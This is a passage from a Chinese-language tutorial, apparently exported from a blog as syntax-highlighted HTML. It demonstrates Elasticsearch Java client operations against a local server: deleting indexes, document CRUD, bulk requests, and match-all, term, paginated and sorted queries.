class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RestHighLevelClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestHighLevelClient</span>(</span><br><span class="line">                RestClient.builder(<span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9200</span>, <span class="string">&quot;http&quot;</span>))</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// 删除索引</span></span><br><span class="line">        <span class="type">DeleteIndexRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DeleteIndexRequest</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="comment">// 发送请求，获取响应</span></span><br><span class="line">        <span class="type">AcknowledgedResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.indices().delete(request, RequestOptions.DEFAULT);</span><br><span class="line"></span><br><span class="line">        System.out.println(response.isAcknowledged());</span><br><span class="line">        client.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="文档操作"><a href="#文档操作" class="headerlink" title="文档操作"></a>文档操作</h1><p>创建数据模型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.es.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="创建文档"><a href="#创建文档" class="headerlink" title="创建文档"></a>创建文档</h2><p>创建数据，添加到文档中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CreateDoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RestHighLevelClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestHighLevelClient</span>(</span><br><span class="line">                RestClient.builder(<span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9200</span>, <span class="string">&quot;http&quot;</span>))</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="type">IndexRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IndexRequest</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        request.id(<span class="string">&quot;1001&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;nan&quot;</span>);</span><br><span class="line">        user.setSex(<span class="string">&quot;男&quot;</span>);</span><br><span class="line">        user.setAge(<span class="number">23</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">userJson</span> <span class="operator">=</span> mapper.writeValueAsString(user);</span><br><span class="line"></span><br><span class="line">        request.source(userJson, XContentType.JSON);</span><br><span class="line"></span><br><span class="line">        <span class="type">IndexResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.index(request, RequestOptions.DEFAULT);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;_index:&quot;</span> + response.getIndex());</span><br><span class="line">        System.out.println(<span class="string">&quot;_id:&quot;</span> + response.getId());</span><br><span class="line">        System.out.println(<span class="string">&quot;_result:&quot;</span> + response.getResult());</span><br><span class="line">        client.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="修改文档"><a href="#修改文档" class="headerlink" title="修改文档"></a>修改文档</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UpdateDoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RestHighLevelClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestHighLevelClient</span>(</span><br><span class="line">                RestClient.builder(<span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9200</span>, <span class="string">&quot;http&quot;</span>))</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="type">UpdateRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UpdateRequest</span>();</span><br><span class="line">        request.index(<span class="string">&quot;user&quot;</span>).id(<span class="string">&quot;1001&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置请求体，对数据进行修改</span></span><br><span class="line">        request.doc(XContentType.JSON, <span class="string">&quot;sex&quot;</span>, <span class="string">&quot;女&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">UpdateResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.update(request, RequestOptions.DEFAULT);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;_index:&quot;</span> + response.getIndex());</span><br><span class="line">        System.out.println(<span class="string">&quot;_id:&quot;</span> + response.getId());</span><br><span class="line">        System.out.println(<span class="string">&quot;_result:&quot;</span> + response.getResult());</span><br><span class="line">        client.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="查询文档"><a href="#查询文档" class="headerlink" title="查询文档"></a>查询文档</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SearchDoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RestHighLevelClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestHighLevelClient</span>(</span><br><span class="line">                RestClient.builder(<span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9200</span>, <span class="string">&quot;http&quot;</span>))</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="type">GetRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GetRequest</span>();</span><br><span class="line">        request.index(<span class="string">&quot;user&quot;</span>).id(<span class="string">&quot;1001&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">GetResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.get(request, RequestOptions.DEFAULT);</span><br><span class="line"></span><br><span class="line">        System.out.println(response.getSourceAsString());</span><br><span class="line">        client.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="删除文档"><a href="#删除文档" class="headerlink" title="删除文档"></a>删除文档</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeleteDoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RestHighLevelClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestHighLevelClient</span>(</span><br><span class="line">                RestClient.builder(<span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9200</span>, <span class="string">&quot;http&quot;</span>))</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="type">DeleteRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DeleteRequest</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        request.id(<span class="string">&quot;1001&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">DeleteResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.delete(request, RequestOptions.DEFAULT);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;_result:&quot;</span> + response.toString());</span><br><span class="line">        client.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="批量操作"><a href="#批量操作" class="headerlink" title="批量操作"></a>批量操作</h2><h3 id="批量创建"><a href="#批量创建" class="headerlink" title="批量创建"></a>批量创建</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BatchCreateDoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RestHighLevelClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestHighLevelClient</span>(</span><br><span class="line">                RestClient.builder(<span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9200</span>, <span class="string">&quot;http&quot;</span>))</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="type">BulkRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BulkRequest</span>();</span><br><span class="line">        request.add(<span class="keyword">new</span> <span class="title class_">IndexRequest</span>(<span class="string">&quot;user&quot;</span>).id(<span class="string">&quot;1001&quot;</span>).source(XContentType.JSON,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;zhangsan&quot;</span>));</span><br><span class="line">        request.add(<span class="keyword">new</span> <span class="title class_">IndexRequest</span>(<span class="string">&quot;user&quot;</span>).id(<span class="string">&quot;1002&quot;</span>).source(XContentType.JSON,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;lisi&quot;</span>));</span><br><span class="line">        request.add(<span class="keyword">new</span> <span class="title class_">IndexRequest</span>(<span class="string">&quot;user&quot;</span>).id(<span class="string">&quot;1003&quot;</span>).source(XContentType.JSON,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;wangwu&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">BulkResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.bulk(request, RequestOptions.DEFAULT);</span><br><span class="line"></span><br><span class="line">        System.out.println(response.getTook());</span><br><span class="line">        System.out.println(response.getItems());</span><br><span class="line">        client.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="批量删除"><a href="#批量删除" class="headerlink" title="批量删除"></a>批量删除</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BatchDeleteDoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RestHighLevelClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestHighLevelClient</span>(</span><br><span class="line">                RestClient.builder(<span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9200</span>, <span class="string">&quot;http&quot;</span>))</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="type">BulkRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BulkRequest</span>();</span><br><span class="line">        request.add(<span class="keyword">new</span> <span class="title class_">DeleteRequest</span>(<span class="string">&quot;user&quot;</span>).id(<span class="string">&quot;1001&quot;</span>));</span><br><span class="line">        request.add(<span class="keyword">new</span> <span class="title class_">DeleteRequest</span>(<span class="string">&quot;user&quot;</span>).id(<span class="string">&quot;1002&quot;</span>));</span><br><span class="line">        request.add(<span class="keyword">new</span> <span class="title class_">DeleteRequest</span>(<span class="string">&quot;user&quot;</span>).id(<span class="string">&quot;1003&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">BulkResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.bulk(request, RequestOptions.DEFAULT);</span><br><span class="line"></span><br><span class="line">        System.out.println(response.getTook());</span><br><span class="line"></span><br><span class="line">        client.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="高级查询"><a href="#高级查询" class="headerlink" title="高级查询"></a>高级查询</h1><h2 id="全量查询"><a href="#全量查询" class="headerlink" title="全量查询"></a>全量查询</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MatchAllQuery</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RestHighLevelClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestHighLevelClient</span>(</span><br><span class="line">                RestClient.builder(<span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">9200</span>, <span class="string">&quot;http&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequest</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="type">SearchSourceBuilder</span> <span class="variable">sourceBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchSourceBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查询所有数据</span></span><br><span class="line">        sourceBuilder.query(QueryBuilders.matchAllQuery());</span><br><span class="line">        request.source(sourceBuilder);</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.search(request, RequestOptions.DEFAULT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查询匹配</span></span><br><span class="line">        <span class="type">SearchHits</span> <span class="variable">hits</span> <span class="operator">=</span> response.getHits();</span><br><span class="line">        System.out.println(<span class="string">&quot;took:&quot;</span> + response.getTook());</span><br><span class="line">        System.out.println(<span class="string">&quot;timeout:&quot;</span> + response.isTimedOut());</span><br><span class="line">        System.out.println(<span class="string">&quot;total:&quot;</span> + hits.getTotalHits());</span><br><span class="line">        System.out.println(<span class="string">&quot;MaxScore:&quot;</span> + hits.getMaxScore());</span><br><span class="line">        System.out.println(<span class="string">&quot;hits========&gt;&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (SearchHit hit : hits) &#123;</span><br><span class="line">            <span class="comment">//输出每条查询的结果信息</span></span><br><span class="line">            System.out.println(hit.getSourceAsString());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;&lt;&lt;========&quot;</span>);</span><br><span class="line">        client.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TermQuery</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RestHighLevelClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestHighLevelClient</span>(</span><br><span class="line">                RestClient.builder(<span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">9200</span>, <span class="string">&quot;http&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequest</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="type">SearchSourceBuilder</span> <span class="variable">sourceBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchSourceBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 条件数据</span></span><br><span class="line">        sourceBuilder.query(QueryBuilders.termQuery(<span class="string">&quot;age&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        request.source(sourceBuilder);</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.search(request, RequestOptions.DEFAULT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查询匹配</span></span><br><span class="line">        <span class="type">SearchHits</span> <span class="variable">hits</span> <span class="operator">=</span> response.getHits();</span><br><span class="line">        System.out.println(<span class="string">&quot;took:&quot;</span> + response.getTook());</span><br><span class="line">        System.out.println(<span class="string">&quot;timeout:&quot;</span> + response.isTimedOut());</span><br><span class="line">        System.out.println(<span class="string">&quot;total:&quot;</span> + hits.getTotalHits());</span><br><span class="line">        System.out.println(<span class="string">&quot;MaxScore:&quot;</span> + hits.getMaxScore());</span><br><span class="line">        System.out.println(<span class="string">&quot;hits========&gt;&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (SearchHit hit : hits) &#123;</span><br><span class="line">            <span class="comment">//输出每条查询的结果信息</span></span><br><span class="line">            System.out.println(hit.getSourceAsString());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;&lt;&lt;========&quot;</span>);</span><br><span class="line">        client.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LimitQuery</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RestHighLevelClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestHighLevelClient</span>(</span><br><span class="line">                RestClient.builder(<span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">9200</span>, <span class="string">&quot;http&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequest</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="comment">// 分页查询</span></span><br><span class="line">        <span class="type">SearchSourceBuilder</span> <span class="variable">sourceBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchSourceBuilder</span>();</span><br><span class="line">        <span class="comment">//(当前页码-1)*每页显示数据条数</span></span><br><span class="line">        <span class="comment">//from：当前页其实索引(第一条数据的顺序号)  size：每页显示多少条</span></span><br><span class="line">        sourceBuilder.from(<span class="number">1</span>).size(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        sourceBuilder.query(QueryBuilders.matchAllQuery());</span><br><span class="line">        request.source(sourceBuilder);</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.search(request, RequestOptions.DEFAULT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查询匹配</span></span><br><span class="line">        <span class="type">SearchHits</span> <span class="variable">hits</span> <span class="operator">=</span> response.getHits();</span><br><span class="line">        System.out.println(<span class="string">&quot;took:&quot;</span> + response.getTook());</span><br><span class="line">        System.out.println(<span class="string">&quot;timeout:&quot;</span> + response.isTimedOut());</span><br><span class="line">        System.out.println(<span class="string">&quot;total:&quot;</span> + hits.getTotalHits());</span><br><span class="line">        System.out.println(<span class="string">&quot;MaxScore:&quot;</span> + hits.getMaxScore());</span><br><span class="line">        System.out.println(<span class="string">&quot;hits========&gt;&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (SearchHit hit : hits) &#123;</span><br><span class="line">            <span class="comment">//输出每条查询的结果信息</span></span><br><span class="line">            System.out.println(hit.getSourceAsString());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;&lt;&lt;========&quot;</span>);</span><br><span class="line">        client.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="查询排序"><a href="#查询排序" class="headerlink" title="查询排序"></a>查询排序</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SortQuery</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RestHighLevelClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestHighLevelClient</span>(</span><br><span class="line">                RestClient.builder(<span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">9200</span>, <span class="string">&quot;http&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequest</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="comment">// 查询排序</span></span><br><span class="line">        <span class="type">SearchSourceBuilder</span> <span class="variable">sourceBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchSourceBuilder</span>();</span><br><span class="line">        sourceBuilder.sort(<span class="string">&quot;age&quot;</span>, SortOrder.ASC);</span><br><span class="line"></span><br><span class="line">        sourceBuilder.query(QueryBuilders.matchAllQuery());</span><br><span class="line">        request.source(sourceBuilder);</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.search(request, RequestOptions.DEFAULT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查询匹配</span></span><br><span class="line">        <span class="type">SearchHits</span> <span class="variable">hits</span> <span class="operator">=</span> response.getHits();</span><br><span class="line">        System.out.println(<span class="string">&quot;took:&quot;</span> + response.getTook());</span><br><span class="line">        System.out.println(<span class="string">&quot;timeout:&quot;</span> + response.isTimedOut());</span><br><span class="line">        System.out.println(<span class="string">&quot;total:&quot;</span> + hits.getTotalHits());</span><br><span class="line">        System.out.println(<span class="string">&quot;MaxScore:&quot;</span> + hits.getMaxScore());</span><br><span class="line">        System.out.println(<span class="string">&quot;hits========&gt;&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (SearchHit hit : hits) &#123;</span><br><span class="line">            <span class="comment">//输出每条查询的结果信息</span></span><br><span class="line">            System.out.println(hit.getSourceAsString());</span><br><span class="line">        